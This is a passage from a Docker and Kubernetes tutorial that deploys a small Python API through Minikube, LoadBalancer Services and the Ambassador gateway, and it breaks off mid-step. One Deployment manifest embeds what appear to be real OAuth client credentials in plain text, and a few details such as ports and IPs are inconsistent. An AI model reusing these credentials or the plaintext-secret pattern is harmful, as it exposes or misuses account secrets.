In order to optimize the Wsgi server, we need to set the number of its workers and threads to: workers = multiprocessing.cpu_count() * 2 + 1 threads = 2 * multiprocessing.cpu_count() This is why we are going to create another Python configuration file (config.py): import multiprocessing workers = multiprocessing.cpu_count() * 2 + 1 threads = 2 * multiprocessing.cpu_count() In the same file, we are going to include other configurations of Gunicorn: from os import environ as env bind = env.get(\"HOST\",\"0.0.0.0\") +\":\"+ env.get(\"PORT\", 5000) This is the final config.py file: import multiprocessing workers = multiprocessing.cpu_count() * 2 + 1 threads = 2 * multiprocessing.cpu_count() from os import environ as env bind = env.get(\"HOST\",\"0.0.0.0\") +\":\"+ env.get(\"PORT\", 5000) In consequence, we should adapt the Dockerfile to the new Gunicorn configuration by changing the last line to : CMD [\"gunicorn\", \"app:app\", \"--config=config.py\"] Now, build docker build -t tgr . and run docker run -it --env-file .env -p 5000:5000 tgr. Pushing the Image to a Remote Registry A Docker registry is a storage and distribution system for named Docker images. The images we built are stored in our local environment and can only be used if you deploy locally. However, if you choose to deploy a Kubernetes cluster in a cloud or any different environment, these images will be not found. This is why we need to push the build images to a remote registry. Think of container registries as a git system for Docker images. There are plenty of containers registries: Dockerhub Amazon Elastic Registry (ECR) Azure Container Registry (ACR) Google Container Registry (GCR) CoreOS Quay You can also host your private container registry that supports OAuth, LDAP and Active Directory authentication using the registry provided by Docker: docker run -d -p 5000:5000 --restart=always --name registry registry:2 More about self-hosting a registry can be found in the official Docker documentation. We are going to use Dockerhub; this is why you need to create an account on hub.docker.com. Now, using Docker CLI, login: Now rebuild the image using the new tag: docker build -t <username>/<image_name>:<tag_version> . Example: docker build -t eon01/tgr:1 . Finally, push the image: A Security Notice Many of the publicly (and even private Docker images) seems to be secure, but it's not the case. When we built our image, we told Docker to copy all the images from the application folder to the image and we push it to an external public registry. Or The above commands will even copy the .env file containing our secrets. A good solution is to tell Docker to ignore these files during the build using a .dockerignore file: **.git **.gitignore **README.md **env.* **Dockerfile* **docker-compose* **.env At this stage, you should remove any image that you pushed to a distant registry, reset the Github tokens, build the new image without any cache: docker build -t eon01/tgr:1 . --no-cache Push it again: Installing Minikube One of the fastest ways to try Kubernetes is using Minkube, which will create a virtual machine for you and deploy a ready-to-use Kubernetes cluster. Before you begin the installation, you need to make sure that your laptop supports virtualization: If your using Linux, run the following command and make sure that the output is not empty: grep -E --color 'vmx|svm' /proc/cpuinfo Mac users should execute: sysctl -a | grep -E --color 'machdep.cpu.features|VMX' If you see VMX in the output, the VT-x feature is enabled in your machine. Windows users should use systeminfo and you should see the following output: Hyper-V Requirements: VM Monitor Mode Extensions: Yes Virtualization Enabled In Firmware: Yes Second Level Address Translation: Yes Data Execution Prevention Available: Yes If everything is okay, you need to install a hypervisor. You have a list of possibilities here: KVM VirtualBox HyperKit VMware Fusion Hyper-V Some of these hypervisors are only compatible with some OSs like Hyper-V (formerly known as Windows Server Virtualization) for windows. VirtualBox is however cross-platform, and this is why we are going to use it here. Make sure to follow the instructions to install it. Now, install Minikube. Linux systems: curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 && chmod +x minikube sudo install minikube /usr/local/bin MacOs: brew cask install minikube curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-darwin-amd64 && chmod +x minikube sudo mv minikube /usr/local/bin Windows: Use Chocolatey as an administrator: Or use the installer binary. Minikube does not support all Kubernetes features (like load balancing for example), however, you can find the most important features there: Minikube supports the following Kubernetes features: DNS NodePorts ConfigMaps and Secrets Dashboards Container Runtime: Docker, rkt, CRI-O, and containerd Enabling CNI (Container Network Interface) Ingress You can also add different addons like: addon-manager dashboard default-storageclass efk freshpod gvisor heapster ingress logviewer metrics-server nvidia-driver-installer nvidia-gpu-device-plugin registry registry-creds storage-provisioner storage-provisioner-gluster If you run minikube start a cluster called minikube will be created; however, you have other choices rather than just creating a regular Minikube cluster. In this example, we are going to create a cluster called \"workshop\", enable a UI to browse the API and activate tailing logs: minikube start -p workshop --extra-config=apiserver.enable-swagger-ui=true --alsologtostderr You have plenty of other options to start a Minikube cluster; you can, for instance, choose the Kubernetes version and the VM driver: minikube start --kubernetes-version=\"v1.12.0\" --vm-driver=\"virtualbox\" Start the new cluster: minikube start -p workshop --extra-config=apiserver.enable-swagger-ui=true --alsologtostderr You can get detailed information about the cluster using: If you didn't install kubectl, follow the official instructions. You can open the dashboard using minikube -p workshop dashboard Deploying to Kubernetes We have three main ways to deploy our container to Kubernetes and scale it to N replica. The first one is the original form of replication in Kubernetes, and it's called Replication Controller. Even if Replica Sets replace it, it's still used in some codes. This is a typical example: apiVersion: v1 kind: ReplicationController metadata: name: app spec: replicas: 3 selector: app: app template: metadata: name: app labels: app: app spec: containers: - name: tgr image: reg/app:v1 ports: - containerPort: 80 We can also use Replica Sets, another way to deploy an app and replicate it: apiVersion: extensions/v1beta1 kind: ReplicaSet metadata: name: app spec: replicas: 3 selector: matchLabels: app: app template: metadata: labels: app: app environment: dev spec: containers: - name: app image: reg/app:v1 ports: - containerPort: 80 Replica Set and Replication Controller do almost the same thing. They ensure that you have a specified number of pod replicas running at any given time in your cluster. There are however, some differences. As you may notice, we are using matchLabels instead of label. Replica Set use Set-Based selectors while replication controllers use Equity-Based selectors. Selectors match Kubernetes objects (like pods) using the constraints of the specified label, and we are going to see an example in a Deployment specification file. Label selectors with equality-based requirements use three operators:=,== and !=. environment = production tier != frontend app == my_app (similar to app = my_app) In the last example, we used this notation: ... spec: replicas: 3 selector: matchLabels: app: app template: metadata: ... We could have used set-based requirements: ... spec: replicas: 3 selector: matchExpressions: - {key: app, operator: In, values: [app]} template: metadata: ... If we have more than 1 value for the app key, we can use: ... spec: replicas: 3 selector: matchExpressions: - {key: app, operator: In, values: [app, my_app, myapp, application]} template: metadata: ... And if we have other keys, we can use them like in the following example: ... spec: replicas: 3 selector: matchExpressions: - {key: app, operator: In, values: [app]} - {key: tier, operator: NotIn, values: [frontend]} - {key: environment, operator: NotIn, values: [production]} template: metadata: ... Newer Kubernetes resources such as Jobs, Deployments, ReplicaSets, and DaemonSets all support set-based requirements as well. This is an example of how we use Kubectl with selectors : kubectl delete pods -l 'env in (production, staging, testing)' Until now, we have seen that the Replication Controller and Replica Set are two ways to deploy our container and manage it in a Kubernetes cluster. However, the recommended approach is using a Deployment that configures a ReplicaSet. It is rather unlikely that we will ever need to create Pods directly for a production use-case since Deployments manages to create Pods for us through ReplicaSets. This is a simple Pod definition: apiVersion: v1 kind: Pod metadata: name: infinite labels: env: production owner: eon01 spec: containers: - name: infinite image: eon01/infinite In practice, we need: A Deployment object : Containers are specified here. A Service object: An abstract way to expose an application running on a set of Pods as a network service. This is a Deployment object that creates three replicas of the container app running the image \"reg/app:v1\". These containers can be reached using port 80: apiVersion: extensions/v1beta1 kind: Deployment metadata: name: app spec: replicas: 3 template: metadata: labels: app: app spec: containers: - name: app image: reg/app:v1 ports: - containerPort: 80 This is the Deployment file we will use (save it to kubernetes/api-deployment.yaml: apiVersion: apps/v1 kind: Deployment metadata: name: tgr labels: name: tgr spec: replicas: 1 selector: matchLabels: name: tgr template: metadata: name: tgr labels: name: tgr spec: containers: - name: tgr image: eon01/tgr:1 ports: - containerPort: 5000 resources: requests: memory: 128Mi limits: memory: 256Mi env: - name: CLIENT_ID value: \"xxxx\" - name: CLIENT_SECRET value: \"xxxxxxxxxxxxxxxxxxxxx\" - name: ENV value: \"prod\" - name: DEBUG value: \"False\" - name: HOST value: \"0.0.0.0\" - name: PORT value: \"5000\" Let's first talk about the API version; in the first example, we used the extensions/v1beta1 and in the second one, we used apps/v1. You may know that Kubernetes project development is very active, and it may be confusing sometimes to follow all the software updates. In Kubernetes version 1.9, apps/v1 is introduced, and extensions/v1beta1, apps/v1beta1 and apps/v1beta2 are deprecated. To make things simpler, to know which version of the API you need to use, use the command: This above command will give you the API versions compatible with your cluster. v1 was the first stable release of the Kubernetes API. It contains many core objects. apps/v1 is the most popular API group in Kubernetes, and it includes functionality related to running applications on Kubernetes, like Deployments, RollingUpdates, and ReplicaSets. autoscaling/v1 allows pods to be autoscaled based on different resource usage metrics. batch/v1 is related to batch processing and and jobs batch/v1beta1 is the beta release of batch/v1 certificates.k8s.io/v1beta1 validates network certificates for secure communication in your cluster. extensions/v1beta1 includes many new, commonly used features. In Kubernetes 1.6, some of these features were relocated from extensions to specific API groups like apps . policy/v1beta1 enables setting a pod disruption budget and new pod security rules rbac.authorization.k8s.io/v1 includes extra functionality for Kubernetes RBAC (role-based access control) ..etc Let's deploy the pod now using the Deployment file we created. kubectl apply -f kubernetes/api-deployment.yaml Note that you can use kubectl create -f kubernetes/api-deployment.yaml command. However, there's a difference, between apply and create. kubectl create is what we call Imperative Management of Kubernetes Objects Using Configuration Files. kubectl create overwrites all changes, and if a resource is having the same id already exists, it will encounter an error. Using this approach, you tell the Kubernetes API what you want to create, replace, or delete, not how you want your K8s cluster world to look like. kubectl apply is what we call Declarative Management of Kubernetes Objects Using Configuration Files approach. kubectl apply makes incremental changes. If an object already exists and you want to apply a new value for replica without deleting and recreating the object again, then kubectl apply is what you need. kubectl apply can also be used even if the object (e.g deployment) does not exist yet. In the Deployment configuration, we also defined our container. We will run a single container here since the replica is set to 1. In the same time, our container will use the image eon01/tgr:1. Since our container will need some environment variables, the best way is to provide them using the Kubernetes deployment definition file. Also, we can add many other configurations, like the requested memory and its limit. The goal here is not using all that Kubernetes allows is to use in a Deployment file, but to see some of the essential features. spec: containers: - name: tgr image: eon01/tgr:1 ports: - containerPort: 5000 resources: requests: memory: 128Mi limits: memory: 256Mi env: - name: CLIENT_ID value: \"xxxx\" - name: CLIENT_SECRET value: \"xxxxxxxxxxxxxxxxxxxxx\" - name: ENV value: \"prod\" - name: DEBUG value: \"False\" - name: HOST value: \"0.0.0.0\" - name: PORT value: \"5000\" In some cases, the Docker registry can be private, and in this case, pulling the image needs authentication. In this case, we need to add the imagePullSecrets configuration: ... containers: - name: private-reg-container image: <your-private-image> imagePullSecrets: - name: registry-credentials ... This is how the registry-credentials secret is created: kubectl create secret docker-registry registry-credentials --docker-server=<your-registry-server> --docker-username=<your-name> --docker-password=<your-pword> --docker-email=<your-email> You can also apply/create the registry-credentials using a YAML file. This is an example: apiVersion: v1 kind: Secret metadata: ... name: registry-credentials ... data: .dockerconfigjson: adjAalkazArrA ... JHJH1QUIIAAX0= type: kubernetes.io/dockerconfigjson If you decode the .dockerconfigjson file using base64 --decode command, you will understand that it's a simple file storing the configuration to access a registry: kubectl get secret regcred --output=\"jsonpath={.data.\\.dockerconfigjson}\" | base64 --decode You will get a similar output to the following one: {\"auths\":{\"your.private.registry.domain.com\":{\"username\":\"eon01\",\"password\":\"xxxxxxxxxxx\",\"email\":\"aymen@eralabs.io\",\"auth\":\"dE3xxxxxxxxx\"}}} Again, let's decode the \"auth\" value using echo \"dE3xxxxxxxxx\"|base64 --decode and it will give you something like eon01:xxxxxxxx which has the format username:password. Now let's see if the deployment is done, let's see how many pods we have: This command will show all the pods within a cluster. We can scale our deployment using a command similar to the following one: kubectl scale --replicas=<expected_replica_num> deployment <deployment_name> Our deployment is called tgr since it's the name we gave to it in the Deployment configuration. You can also make verification by typing kubectl get deployment. Let's scale it: kubectl scale --replicas=2 deployment tgr Each of these containers will be accessible on port 500 from outside the container but not from outside the cluster. The number of pods/containers running for our API can be variable and may change dynamically. We can set up a load balancer that will balance traffic between the two pods we created, but since each pod can disappear to be recreated, its hostname and address will change. In all cases, pods are not meant to receive traffic directly, but they need to be exposed to traffic using a Service. In other words, the set of Pods running in one moment in time could be different from the set of Pods running that application a moment later. At the moment, the only service running is the cluster IP (which is related to Minikube and give us access to the cluster we created): Services In Kubernetes, since Pods are mortals, we should create an abstraction that defines a logical set of Pods and how to access them. This is the role of Services. In our case, creating a load balancer is a suitable solution. This is the configuration file of a Service object that will listen on the port 80 and load-balance traffic to the Pod with the label nameequals to app . The latter is accessible internally using the port 5000 like it's defined in the Deployment configuration: ... ports: - containerPort: 5000 ... This is how the Service looks like: apiVersion: v1 kind: Service metadata: name: lb labels: name: lb spec: ports: - port: 80 targetPort: 5000 selector: name: tgr type: LoadBalancer Save this file to kubernetes/api-service.yaml and deploy it using kubectl apply -f kubernetes/api-service.yaml. If you type kubectl get service, you will get the list of Services running in our local cluster: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 <none> 443/TCP 51m lb LoadBalancer 10.99.147.117 <pending> 80:30546/TCP 21s Not that the ClusterIP does not have an external IP while the app Service external IP is pending. No need to wait for the external IP of the created service, since Minikube does not really deploy a load balancer and this feature will only work if you configure a Load Balancer provider. If you are using a Cloud provider, say AWS, an AWS load balancer will be set up for you, GKE will provide a Cloud Load Balancer..etc You may also configure other types of load balancers. There are different types of Services that we can use to expose access to the API publicly: ClusterIP: is the default Kubernetes service. It exposes the Service on a cluster-internal IP. You can access it using the Kubernetes proxy. Illustration by Ahmet Alp Balkan via Medium. NodePort: Exposes the Service on each Nodes (VM's) IP at a static port called the NodePort. (In our example, we have a single node). This is a primitive way to make an application accessible from outside the cluster and is not suitable for many use cases since your nodes (VMs) IP addresses may change at any time. The service is accessible using <NodeIP>:<NodePort>. Illustration by Ahmet Alp Balkan via Medium. LoadBalancer: This is more advanced than a NodePort Service. Usually, a Load Balancer exposes a Service externally using a cloud providers load balancer. NodePort and ClusterIP Services, to which the external load balancer routes, are automatically created. Illustration by Ahmet Alp Balkan via Medium. We created a Load Balancer using a Service on our Minikube cluster, but since we don't have a Load Balancer to run, we can access the API service using the Cluster IP followed by the Service internal Port: Output: Now execute kubectl get services : NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 <none> 443/TCP 51m lb LoadBalancer 10.99.147.117 <pending> 80:30546/TCP 21s Use the IP 192.168.99.199 followed by the port 30546 to access the API. You can test this using a curl command: curl \"http://192.168.99.100:30546/?l=python&n=1\" --- {\"repos\":[{\"archive_url\":\"https://api.github.com/repos/vinta/awesome-python/{archive_format}{/ref}\",\"archived\":false,\"assignees_url\":\"https://api.github.com/repos/vinta/awesome-python/assignees{/user}\",\"blobs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/blobs{/sha}\",\"branches_url\":\"https://api.github.com/repos/vinta/awesome-python/branches{/branch}\",\"clone_url\":\"https://github.com/vinta/awesome-python.git\",\"collaborators_url\":\"https://api.github.com/repos/vinta/awesome-python/collaborators{/collaborator}\",\"comments_url\":\"https://api.github.com/repos/vinta/awesome-python/comments{/number}\",\"commits_url\":\"https://api.github.com/repos/vinta/awesome-python/commits{/sha}\",\"compare_url\":\"https://api.github.com/repos/vinta/awesome-python/compare/{base}...{head}\",\"contents_url\":\"https://api.github.com/repos/vinta/awesome-python/contents/{+path}\",\"contributors_url\":\"https://api.github.com/repos/vinta/awesome-python/contributors\",\"created_at\":\"2014-06-27T21:00:06Z\",\"default_branch\":\"master\",\"deployments_url\":\"https://api.github.com/repos/vinta/awesome-python/deployments\",\"description\":\"A curated list of awesome Python frameworks, libraries, software and resources\",\"disabled\":false,\"downloads_url\":\"https://api.github.com/repos/vinta/awesome-python/downloads\",\"events_url\":\"https://api.github.com/repos/vinta/awesome-python/events\",\"fork\":false,\"forks\":13929,\"forks_count\":13929,\"forks_url\":\"https://api.github.com/repos/vinta/awesome-python/forks\",\"full_name\":\"vinta/awesome-python\",\"git_commits_url\":\"https://api.github.com/repos/vinta/awesome-python/git/commits{/sha}\",\"git_refs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/refs{/sha}\",\"git_tags_url\":\"https://api.github.com/repos/vinta/awesome-python/git/tags{/sha}\",\"git_url\":\"git://github.com/vinta/awesome-python.git\",\"has_downloads\":true,\"has_issues\":true,\"has_pages\":true,\"has_projects\":false,\"has_wiki\":false,\"homepage\":\"https://awesome-python.com/\",\"hooks_url\":\"https://api.github.com/repos/vinta/awesome-python/hooks\",\"html_url\":\"https://github.com/vinta/awesome-python\",\"id\":21289110,\"issue_comment_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/comments{/number}\",\"issue_events_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/events{/number}\",\"issues_url\":\"https://api.github.com/repos/vinta/awesome-python/issues{/number}\",\"keys_url\":\"https://api.github.com/repos/vinta/awesome-python/keys{/key_id}\",\"labels_url\":\"https://api.github.com/repos/vinta/awesome-python/labels{/name}\",\"language\":\"Python\",\"languages_url\":\"https://api.github.com/repos/vinta/awesome-python/languages\",\"license\":{\"key\":\"other\",\"name\":\"Other\",\"node_id\":\"MDc6TGljZW5zZTA=\",\"spdx_id\":\"NOASSERTION\",\"url\":null},\"merges_url\":\"https://api.github.com/repos/vinta/awesome-python/merges\",\"milestones_url\":\"https://api.github.com/repos/vinta/awesome-python/milestones{/number}\",\"mirror_url\":null,\"name\":\"awesome-python\",\"network_count\":13929,\"node_id\":\"MDEwOlJlcG9zaXRvcnkyMTI4OTExMA==\",\"notifications_url\":\"https://api.github.com/repos/vinta/awesome-python/notifications{?since,all,participating}\",\"open_issues\":482,\"open_issues_count\":482,\"owner\":{\"avatar_url\":\"https://avatars2.githubusercontent.com/u/652070?v=4\",\"events_url\":\"https://api.github.com/users/vinta/events{/privacy}\",\"followers_url\":\"https://api.github.com/users/vinta/followers\",\"following_url\":\"https://api.github.com/users/vinta/following{/other_user}\",\"gists_url\":\"https://api.github.com/users/vinta/gists{/gist_id}\",\"gravatar_id\":\"\",\"html_url\":\"https://github.com/vinta\",\"id\":652070,\"login\":\"vinta\",\"node_id\":\"MDQ6VXNlcjY1MjA3MA==\",\"organizations_url\":\"https://api.github.com/users/vinta/orgs\",\"received_events_url\":\"https://api.github.com/users/vinta/received_events\",\"repos_url\":\"https://api.github.com/users/vinta/repos\",\"site_admin\":false,\"starred_url\":\"https://api.github.com/users/vinta/starred{/owner}{/repo}\",\"subscriptions_url\":\"https://api.github.com/users/vinta/subscriptions\",\"type\":\"User\",\"url\":\"https://api.github.com/users/vinta\"},\"private\":false,\"pulls_url\":\"https://api.github.com/repos/vinta/awesome-python/pulls{/number}\",\"pushed_at\":\"2019-08-16T15:21:42Z\",\"releases_url\":\"https://api.github.com/repos/vinta/awesome-python/releases{/id}\",\"size\":4994,\"ssh_url\":\"git@github.com:vinta/awesome-python.git\",\"stargazers_count\":71222,\"stargazers_url\":\"https://api.github.com/repos/vinta/awesome-python/stargazers\",\"statuses_url\":\"https://api.github.com/repos/vinta/awesome-python/statuses/{sha}\",\"subscribers_count\":5251,\"subscribers_url\":\"https://api.github.com/repos/vinta/awesome-python/subscribers\",\"subscription_url\":\"https://api.github.com/repos/vinta/awesome-python/subscription\",\"svn_url\":\"https://github.com/vinta/awesome-python\",\"tags_url\":\"https://api.github.com/repos/vinta/awesome-python/tags\",\"teams_url\":\"https://api.github.com/repos/vinta/awesome-python/teams\",\"trees_url\":\"https://api.github.com/repos/vinta/awesome-python/git/trees{/sha}\",\"updated_at\":\"2019-08-17T16:11:44Z\",\"url\":\"https://api.github.com/repos/vinta/awesome-python\",\"watchers\":71222,\"watchers_count\":71222}],\"status\":\"ok\"} Inconvenience of Load Balancer Service Typically, load balancers are provisioned by the Cloud provider you're using. A load balancer can handle one service but imagine if you have ten services, each one will need a load balancer; this is when it becomes costly. The best solution, in this case, is set up an Ingress controller that acts as a smart router and can be deployed at the edge of the cluster, therefore in the front of all the services you deploy. Illustration by Ahmet Alp Balkan via Medium. An API Gateway Ambassador is an Open Source Kubernetes-Native API Gateway built on the Envoy Proxy. It provides a solution for traffic management and application security. It's described as is a specialized control plane that translates Kubernetes annotations to Envoy configuration. All traffic is directly handled by the high-performance Envoy Proxy. Photo credit: https://www.getambassador.io/concepts/architecture As it's described in Envoy official website: Originally built at Lyft, Envoy is a high-performance C++ distributed proxy designed for single services and applications, as well as a communication bus and universal data plane designed for large microservice service mesh architectures. Built on the learnings of solutions such as NGINX, HAProxy, hardware load balancers, and cloud load balancers, Envoy runs alongside every application and abstracts the network by providing common features in a platform-agnostic manner. When all service traffic in an infrastructure flows via an Envoy mesh, it becomes easy to visualize problem areas via consistent observability, tune overall performance, and add substrate features in a single place. We are going to use Ambassador as an API Gateway; we no longer need the load balancer service we created in the first part. Let's remove it: kubectl delete -f kubernetes/api-service.yaml To deploy Ambassador in your default namespace, first, you need to check if Kubernetes has RBAC enabled: kubectl cluster-info dump --namespace kube-system | grep authorization-mode If RBAC is enabled: kubectl apply -f https://getambassador.io/yaml/ambassador/ambassador-rbac.yaml Without RBAC, you can use: kubectl apply -f https://getambassador.io/yaml/ambassador/ambassador-no-rbac.yaml Ambassador is deployed as a Kubernetes Service that references the ambassador Deployment you deployed previously. Create the following YAML and put it in a file called kubernetes/ambassador-service.yaml. --- apiVersion: v1 kind: Service metadata: name: ambassador spec: type: LoadBalancer externalTrafficPolicy: Local ports: - port: 80 targetPort: 8080 selector: service: ambassador Deploy the service: kubectl apply -f ambassador-service.yaml Now let's use this file containing the Deployment configuration for our API as well as the Ambassador Service configuration relative to the same Deployment. Call this file kubernetes/api-deployment-with-ambassador.yaml: --- apiVersion: v1 kind: Service metadata: name: tgr annotations: getambassador.io/config: | --- apiVersion: ambassador/v1 kind: Mapping name: tgr_mapping prefix: / service: tgr:5000 spec: ports: - name: tgr port: 5000 targetPort: 5000 selector: app: tgr --- apiVersion: apps/v1 kind: Deployment metadata: name: tgr spec: replicas: 1 selector: matchLabels: app: tgr strategy: type: RollingUpdate template: metadata: labels: app: tgr spec: containers: - name: tgr image: eon01/tgr:1 ports: - containerPort: 5000 env: - name: CLIENT_ID value: \"453486b9225e0e26c525\" - name: CLIENT_SECRET value: \"a63e841d5c18f41b9264a1a2ac0675a1f903ee8c\" - name: ENV value: \"prod\" - name: DEBUG value: \"False\" - name: HOST value: \"0.0.0.0\" - name: PORT value: \"5000\" Deploy the previously created configuration: kubectl apply -f kubernetes/api-deployment-with-ambassador.yaml Let's test things out: We need the external IP for Ambassador: kubectl get svc -o wide ambassador You should see something like: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR ambassador LoadBalancer 10.103.201.130 <pending> 80:30283/TCP 9m2s service=ambassador If you are using Minikube, it is normal to see the external IP in the pending state. We can use minikube -p workshop service list to get the Ambassador IP. You will get an output similar to the following: |-------------|------------------|-----------------------------| | NAMESPACE | NAME | URL | |-------------|------------------|-----------------------------| | default | ambassador | http://192.168.99.100:30283 | | default | ambassador-admin | http://192.168.99.100:30084 | | default | kubernetes | No node port | | default | tgr | No node port | | kube-system | kube-dns | No node port | |-------------|------------------|-----------------------------| Now you can use the API using the IP http://192.168.99.100:30283: curl \"http://192.168.99.100:30283/?l=python&n=1\" --- {\"repos\":[{\"archive_url\":\"https://api.github.com/repos/vinta/awesome-python/{archive_format}{/ref}\",\"archived\":false,\"assignees_url\":\"https://api.github.com/repos/vinta/awesome-python/assignees{/user}\",\"blobs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/blobs{/sha}\",\"branches_url\":\"https://api.github.com/repos/vinta/awesome-python/branches{/branch}\",\"clone_url\":\"https://github.com/vinta/awesome-python.git\",\"collaborators_url\":\"https://api.github.com/repos/vinta/awesome-python/collaborators{/collaborator}\",\"comments_url\":\"https://api.github.com/repos/vinta/awesome-python/comments{/number}\",\"commits_url\":\"https://api.github.com/repos/vinta/awesome-python/commits{/sha}\",\"compare_url\":\"https://api.github.com/repos/vinta/awesome-python/compare/{base}...{head}\",\"contents_url\":\"https://api.github.com/repos/vinta/awesome-python/contents/{+path}\",\"contributors_url\":\"https://api.github.com/repos/vinta/awesome-python/contributors\",\"created_at\":\"2014-06-27T21:00:06Z\",\"default_branch\":\"master\",\"deployments_url\":\"https://api.github.com/repos/vinta/awesome-python/deployments\",\"description\":\"A curated list of awesome Python frameworks, libraries, software and resources\",\"disabled\":false,\"downloads_url\":\"https://api.github.com/repos/vinta/awesome-python/downloads\",\"events_url\":\"https://api.github.com/repos/vinta/awesome-python/events\",\"fork\":false,\"forks\":13933,\"forks_count\":13933,\"forks_url\":\"https://api.github.com/repos/vinta/awesome-python/forks\",\"full_name\":\"vinta/awesome-python\",\"git_commits_url\":\"https://api.github.com/repos/vinta/awesome-python/git/commits{/sha}\",\"git_refs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/refs{/sha}\",\"git_tags_url\":\"https://api.github.com/repos/vinta/awesome-python/git/tags{/sha}\",\"git_url\":\"git://github.com/vinta/awesome-python.git\",\"has_downloads\":true,\"has_issues\":true,\"has_pages\":true,\"has_projects\":false,\"has_wiki\":false,\"homepage\":\"https://awesome-python.com/\",\"hooks_url\":\"https://api.github.com/repos/vinta/awesome-python/hooks\",\"html_url\":\"https://github.com/vinta/awesome-python\",\"id\":21289110,\"issue_comment_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/comments{/number}\",\"issue_events_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/events{/number}\",\"issues_url\":\"https://api.github.com/repos/vinta/awesome-python/issues{/number}\",\"keys_url\":\"https://api.github.com/repos/vinta/awesome-python/keys{/key_id}\",\"labels_url\":\"https://api.github.com/repos/vinta/awesome-python/labels{/name}\",\"language\":\"Python\",\"languages_url\":\"https://api.github.com/repos/vinta/awesome-python/languages\",\"license\":{\"key\":\"other\",\"name\":\"Other\",\"node_id\":\"MDc6TGljZW5zZTA=\",\"spdx_id\":\"NOASSERTION\",\"url\":null},\"merges_url\":\"https://api.github.com/repos/vinta/awesome-python/merges\",\"milestones_url\":\"https://api.github.com/repos/vinta/awesome-python/milestones{/number}\",\"mirror_url\":null,\"name\":\"awesome-python\",\"network_count\":13933,\"node_id\":\"MDEwOlJlcG9zaXRvcnkyMTI4OTExMA==\",\"notifications_url\":\"https://api.github.com/repos/vinta/awesome-python/notifications{?since,all,participating}\",\"open_issues\":482,\"open_issues_count\":482,\"owner\":{\"avatar_url\":\"https://avatars2.githubusercontent.com/u/652070?v=4\",\"events_url\":\"https://api.github.com/users/vinta/events{/privacy}\",\"followers_url\":\"https://api.github.com/users/vinta/followers\",\"following_url\":\"https://api.github.com/users/vinta/following{/other_user}\",\"gists_url\":\"https://api.github.com/users/vinta/gists{/gist_id}\",\"gravatar_id\":\"\",\"html_url\":\"https://github.com/vinta\",\"id\":652070,\"login\":\"vinta\",\"node_id\":\"MDQ6VXNlcjY1MjA3MA==\",\"organizations_url\":\"https://api.github.com/users/vinta/orgs\",\"received_events_url\":\"https://api.github.com/users/vinta/received_events\",\"repos_url\":\"https://api.github.com/users/vinta/repos\",\"site_admin\":false,\"starred_url\":\"https://api.github.com/users/vinta/starred{/owner}{/repo}\",\"subscriptions_url\":\"https://api.github.com/users/vinta/subscriptions\",\"type\":\"User\",\"url\":\"https://api.github.com/users/vinta\"},\"private\":false,\"pulls_url\":\"https://api.github.com/repos/vinta/awesome-python/pulls{/number}\",\"pushed_at\":\"2019-08-16T15:21:42Z\",\"releases_url\":\"https://api.github.com/repos/vinta/awesome-python/releases{/id}\",\"size\":4994,\"ssh_url\":\"git@github.com:vinta/awesome-python.git\",\"stargazers_count\":71269,\"stargazers_url\":\"https://api.github.com/repos/vinta/awesome-python/stargazers\",\"statuses_url\":\"https://api.github.com/repos/vinta/awesome-python/statuses/{sha}\",\"subscribers_count\":5254,\"subscribers_url\":\"https://api.github.com/repos/vinta/awesome-python/subscribers\",\"subscription_url\":\"https://api.github.com/repos/vinta/awesome-python/subscription\",\"svn_url\":\"https://github.com/vinta/awesome-python\",\"tags_url\":\"https://api.github.com/repos/vinta/awesome-python/tags\",\"teams_url\":\"https://api.github.com/repos/vinta/awesome-python/teams\",\"trees_url\":\"https://api.github.com/repos/vinta/awesome-python/git/trees{/sha}\",\"updated_at\":\"2019-08-19T08:21:51Z\",\"url\":\"https://api.github.com/repos/vinta/awesome-python\",\"watchers\":71269,\"watchers_count\":71269}],\"status\":\"ok\"} Edge Proxy vs Service Mesh You may have heard of tools like Istio and Linkerd and it may be confusing to compare Ambassador or Envoy to these tools. We are going to understand the differences here. Istio is described as a tool to connect, secure, control, and observe services.The same features are implemented by its alternatives like Linkerd or Consul. These tools are called Service Mesh. Ambassador is a, API gateway for services (or microservices) and it's deployed at the edge of your network. It routes incoming traffic to a cluster internal services and this what we call \"north-south\" traffic. Istio, in the other hand, is a service mesh for Kubernetes services (or microservices). It's designed to add application-level Layer (L7) observability, routing, and resilience to service-to-service traffic and this is what we call \"east-west\" traffic. The fact that both Istio and Ambassador are built using Envoy, does not mean they have the same features or usability. Therefore, they can be deployed together in the same cluster. Accessing the Kubernetes API If you remember, when we created our Minikube cluster we used --extra-config=apiserver.enable-swagger-ui=true. This configuration makes the Kubernetes API \"browsable\" via a web browser. When using Minikube, in order to access the Kubernetes API using a browser, we need to create a proxy: kubectl proxy --port=8080 & Now we can test this out using Curl: curl http://localhost:8080/api/ --- { \"kind\": \"APIVersions\", \"versions\": [ \"v1\" ], \"serverAddressByClientCIDRs\": [ { \"clientCIDR\": \"0.0.0.0/0\", \"serverAddress\": \"192.168.99.100:8443\" } ] } We can get a list of the APIs and resources we can access by visiting: http://localhost:8080/. For instance, we can get a list of metrics here http://localhost:8080/metrics. Using an API Client We are going to use the Kubernetes client: # import json # import requests # @app.route('/pods') # def monitor(): # # api_url = \"http://kubernetes.default.svc/api/v1/pods/\" # response = requests.get(api_url) # if response.status_code == 200: # return json.loads(response.content.decode('utf-8')) # else: # return None Accessing the API from inside a POD By default, a Pod is associated with a service account, and a credential (token) for that service account is placed into the filesystem tree of each container in that Pod, at /var/run/secrets/kubernetes.io/serviceaccount/token. Let's try to go inside a Pod and access the API. Use kubectl get pods to get a list of pods NAME READY STATUS RESTARTS AGE ambassador-64d8b877f9-4bzvn 1/1 Running 0 103m 